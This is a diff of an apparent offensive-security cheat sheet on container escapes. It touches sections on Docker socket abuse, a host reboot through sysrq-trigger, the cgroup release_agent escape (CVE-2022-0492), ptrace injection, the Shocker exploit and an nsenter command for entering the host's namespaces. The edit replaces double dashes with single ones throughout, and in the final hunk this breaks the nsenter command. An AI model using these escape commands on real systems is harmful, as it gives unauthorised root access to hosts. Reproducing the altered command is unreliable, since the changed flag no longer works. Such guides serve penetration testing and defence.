@@ -31,7 +31,7 @@ capsh --print 2>/dev/null
 ## 1. Docker Socket Mount
 
 If `/var/run/docker.sock` is mounted into the container, you have full control of the Docker
-daemon on the host -- effectively root.
+daemon on the host - effectively root.
 
 ```bash
 # Check
@@ -115,7 +115,7 @@ echo b > /proc/sysrq-trigger  # CAUTION: reboots the host
 
 ## 3. Capability-Based Escape
 
-### SYS_ADMIN -- cgroup v1 release_agent (CVE-2022-0492)
+### SYS_ADMIN - cgroup v1 release_agent (CVE-2022-0492)
 
 The classic container escape. Requires cgroup v1 and SYS_ADMIN capability.
 
@@ -140,9 +140,9 @@ sh -c "echo \$\$ > $d/w/cgroup.procs"
 cat /output
 ```
 
-cgroup v2 does NOT have `release_agent` -- this escape doesn't work on cgroup v2 systems.
+cgroup v2 does NOT have `release_agent` - this escape doesn't work on cgroup v2 systems.
 
-### SYS_PTRACE -- Process Injection
+### SYS_PTRACE - Process Injection
 
 ```bash
 # Find a host process (if host PID namespace is shared)
@@ -152,7 +152,7 @@ ps aux | grep root
 # Use a tool like linux-inject or manual ptrace calls
 ```
 
-### DAC_READ_SEARCH -- Shocker Exploit
+### DAC_READ_SEARCH - Shocker Exploit
 
 Bypasses filesystem read permissions. Can read any file on the host if the host filesystem
 is accessible via /proc or mounted paths.
@@ -242,7 +242,7 @@ docker info 2>/dev/null | grep -i runc
 
 ```bash
 # If hostPID: true (--pid=host)
-nsenter -t 1 -m -u -i -n -p -- /bin/bash
+nsenter -t 1 -m -u -i -n -p - /bin/bash
 # This enters all namespaces of PID 1 (host init process)
 ```
 
